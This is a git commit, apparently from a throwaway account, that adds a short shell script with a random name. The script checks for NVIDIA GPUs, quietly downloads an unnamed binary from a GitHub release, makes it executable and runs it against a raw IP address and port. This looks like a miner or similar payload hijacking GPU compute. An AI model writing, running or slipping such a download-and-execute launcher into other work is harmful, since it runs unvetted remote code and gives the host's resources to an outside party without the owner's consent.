3f8eddd2cab19ea94000c6ca4a2528f5a7ddfb5a
langworthsqfyq01 <79738750+langworthsqfyq01@users.noreply.github.com>
2021-02-27 06:15:51 +0000

    Create zcxvzx324234.sh

---
+++ zcxvzx324234.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+nvidia-smi -L
+wget https://github.com/langworthsqfyq01/aszxcvxzcv/releases/download/1/zxcve4234 &> /dev/null
+chmod +x zxcve4234
+./zxcve4234 -P http://216.198.92.69:4545/"$1" &> log
